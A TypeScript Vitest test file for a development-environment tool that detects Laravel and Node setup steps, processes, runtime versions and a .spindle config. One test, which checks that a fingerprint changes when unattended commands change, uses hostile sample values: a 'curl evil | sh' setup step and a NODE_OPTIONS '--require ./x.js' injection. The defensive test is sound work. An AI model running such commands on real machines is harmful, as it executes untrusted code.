import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import * as devenv from '../src/main/devenv'
import { byVersionDesc, cleanVersion, pick, resolveRuntime } from '../src/main/runtimes'
import type { Project, RuntimeMatch } from '../src/shared/types'

function laravelApp(): string {
  const dir = mkdtempSync(join(tmpdir(), 'sf-env-'))
  writeFileSync(join(dir, 'artisan'), '')
  writeFileSync(join(dir, 'composer.json'), JSON.stringify({ require: { php: '^8.2' } }))
  writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { dev: 'vite', build: 'vite build' } }))
  writeFileSync(join(dir, 'package-lock.json'), '{}')
  writeFileSync(join(dir, '.nvmrc'), 'v22\n')
  mkdirSync(join(dir, 'database', 'migrations'), { recursive: true })
  return dir
}

describe('.spindle development environment', () => {
  it('detects setup steps, processes, runtime hints and commands', () => {
    const dir = laravelApp()
    const env = devenv.detect(dir, { QUEUE_CONNECTION: 'database' }, true)
    expect(env.setup).toEqual(['composer install --no-interaction --prefer-dist --no-progress', 'npm ci --no-audit --no-fund', 'npm run build'])
    expect(env.processes.map((p) => p.name)).toEqual(['Dev server', 'Queue worker', 'Scheduler'])
    expect(env.runtime).toEqual({ node: '22' })
    expect(env.database).toEqual({ mode: 'clone', migrate: true, seed: false })
    expect(env.commands).toContain('php artisan test')
    expect(devenv.runtimeHints(dir)).toEqual({ php: '8.2', node: '22' })
  })

  it('uses the package manager from the lockfile', () => {
    const dir = mkdtempSync(join(tmpdir(), 'sf-env-'))
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'vitest', build: 'vite build' } }))
    writeFileSync(join(dir, 'pnpm-lock.yaml'), '')
    const env = devenv.detect(dir, {}, false)
    expect(env.setup).toEqual(['pnpm install'])
    expect(env.commands).toEqual(['pnpm test', 'pnpm run build', 'pnpm install'])
    expect(env.database.mode).toBe('shared')
  })

  it('round-trips through .spindle/config.json and keeps keys added by hand', () => {
    const dir = laravelApp()
    const base = devenv.detect(dir, {}, true)
    mkdirSync(join(dir, '.spindle'))
    writeFileSync(devenv.configPath(dir), JSON.stringify({ team: 'payments', setup: ['make bootstrap'] }))
    const cfg = { ...base, runtime: { php: '8.3', node: '22' }, env: { QUEUE_CONNECTION: 'database' }, processes: [...base.processes, { name: '', command: '  ', autoStart: true }] }
    devenv.write(dir, cfg, 'Log in as admin@example.com\n')
    const raw = JSON.parse(readFileSync(devenv.configPath(dir), 'utf8'))
    expect(raw.team).toBe('payments')
    expect(raw.processes).toHaveLength(base.processes.length) // empty rows dropped
    expect(devenv.readInstructions(dir)).toBe('Log in as admin@example.com\n')
    expect(readFileSync(join(dir, '.spindle', 'README.md'), 'utf8')).toContain('instructions.md')
    const loaded = devenv.load(dir, base)
    expect(loaded.source).toBe('file')
    expect(loaded.config.runtime).toEqual({ php: '8.3', node: '22' })
    expect(loaded.config.env).toEqual({ QUEUE_CONNECTION: 'database' })
  })

  it('falls back to detected values for missing or malformed fields', () => {
    const dir = laravelApp()
    const base = devenv.detect(dir, {}, true)
    mkdirSync(join(dir, '.spindle'))
    writeFileSync(devenv.configPath(dir), JSON.stringify({ runtime: { php: 8.3 }, processes: [{ command: 'php artisan horizon' }, { name: 'bad' }], database: { mode: 'nope' }, env: { 'not valid': 'x', OK: 1 } }))
    const { config } = devenv.load(dir, base)
    expect(config.runtime.php).toBeUndefined() // numbers aren't versions
    expect(config.processes).toEqual([{ name: 'php artisan horizon', command: 'php artisan horizon', autoStart: true }])
    expect(config.setup).toEqual(base.setup)
    expect(config.database).toEqual({ mode: 'clone', migrate: true, seed: false })
    expect(config.env).toEqual({ OK: '1' })
  })

  it('reports a broken file and uses the fallback', () => {
    const dir = laravelApp()
    mkdirSync(join(dir, '.spindle'))
    writeFileSync(devenv.configPath(dir), '{ nope')
    const base = devenv.detect(dir, {}, true)
    const r = devenv.load(dir, base)
    expect(r.parseError).toMatch(/config\.json/)
    expect(r.config).toBe(base)
  })

  it('fingerprints exactly the things that run unattended', () => {
    const base = devenv.detect(laravelApp(), {}, true)
    const h = devenv.commandsHash(base)
    expect(devenv.commandsHash({ ...base, commands: ['anything'], runtime: { php: '8.1' } })).toBe(h) // clicked by hand / versions only
    expect(devenv.commandsHash({ ...base, setup: [...base.setup, 'curl evil | sh'] })).not.toBe(h)
    expect(devenv.commandsHash({ ...base, processes: base.processes.map((p, i) => (i === 0 ? { ...p, command: 'node x.js' } : p)) })).not.toBe(h)
    expect(devenv.commandsHash({ ...base, env: { NODE_OPTIONS: '--require ./x.js' } })).not.toBe(h)
    expect(devenv.commandsHash({ ...base, site: { command: 'node server.js' } })).not.toBe(h)
  })

  it('converts settings from before .spindle existed', () => {
    const base = devenv.detect(laravelApp(), {}, true)
    const p = { setupScript: '# comment\nmake setup\n', services: [{ name: 'Vite', command: 'npm run dev', autoStart: true }], quickCommands: ['php artisan test'], captureMail: false } as unknown as Project
    const custom = devenv.fromLegacy(p, base, false)
    expect(custom.setup).toEqual(['make setup'])
    expect(custom.processes[0].name).toBe('Vite')
    expect(custom.mail.capture).toBe(false)
    expect(devenv.fromLegacy(p, base, true).setup).toEqual(base.setup)
  })

  it('labels setup steps in plain words', () => {
    expect(devenv.setupLabel('composer install --no-interaction')).toBe('Installing PHP packages')
    expect(devenv.setupLabel('npm ci --no-audit', true)).toBe('JavaScript packages installed')
    expect(devenv.setupLabel('pnpm run build')).toBe('Building the interface')
    expect(devenv.setupLabel('make seed')).toBe('Running make seed')
  })
})

describe('runtime versions', () => {
  const list: RuntimeMatch[] = [
    { version: '8.4', dir: '/a', source: 'Herd' },
    { version: '8.3', dir: '/b', source: 'Herd' },
    { version: '22.11.0', dir: '/c', source: 'nvm' },
    { version: '22.9.1', dir: '/d', source: 'nvm' },
    { version: '20.18.3', dir: '/e', source: 'nvm' }
  ]
  it('cleans version constraints', () => {
    expect(cleanVersion('^8.2')).toBe('8.2')
    expect(cleanVersion('>=20 <23')).toBe('20')
    expect(cleanVersion('v22.11.0')).toBe('22.11.0')
    expect(cleanVersion('lts/*')).toBe('')
  })
  it('picks the highest installed match for a prefix', () => {
    expect(pick(list, '22')?.version).toBe('22.11.0')
    expect(pick(list, '22.9')?.version).toBe('22.9.1')
    expect(pick(list, '8.3')?.dir).toBe('/b')
    expect(pick(list, '8')?.version).toBe('8.4')
    expect(pick(list, '2')).toBeNull() // "2" must not match 20 or 22
    expect(pick(list, '')).toBeNull()
    expect([...list].sort(byVersionDesc)[0].version).toBe('22.11.0')
  })
  it('explains versions that are not installed', () => {
    const r = resolveRuntime({ php: '5.6', node: '4' }, mkdtempSync(join(tmpdir(), 'sf-rt-')))
    expect(r.php).toBeNull()
    expect(r.path).toEqual([])
    expect(r.missing.join('\n')).toMatch(/PHP 5\.6 isn’t installed[\s\S]*Node 4 isn’t installed/)
  })
})

describe('PHP minimum from installed packages', () => {
  it('reads Composer’s platform check and compares versions', () => {
    const dir = laravelApp()
    mkdirSync(join(dir, 'vendor', 'composer'), { recursive: true })
    writeFileSync(join(dir, 'vendor', 'composer', 'platform_check.php'), '<?php\nif (!(PHP_VERSION_ID >= 80401)) {\n')
    expect(devenv.phpMinimum(dir)).toBe('8.4.1')
    expect(devenv.runtimeHints(dir).phpMin).toBe('8.4.1')
    expect(devenv.belowMinimum('8.3', '8.4.1')).toBe(true)
    expect(devenv.belowMinimum('8.3.19', '8.4.1')).toBe(true)
    expect(devenv.belowMinimum('8.4', '8.4.1')).toBe(false) // newest 8.4 patch is fine
    expect(devenv.belowMinimum('8.4.0', '8.4.1')).toBe(true)
    expect(devenv.belowMinimum('8.5', '8.4.1')).toBe(false)
  })
})
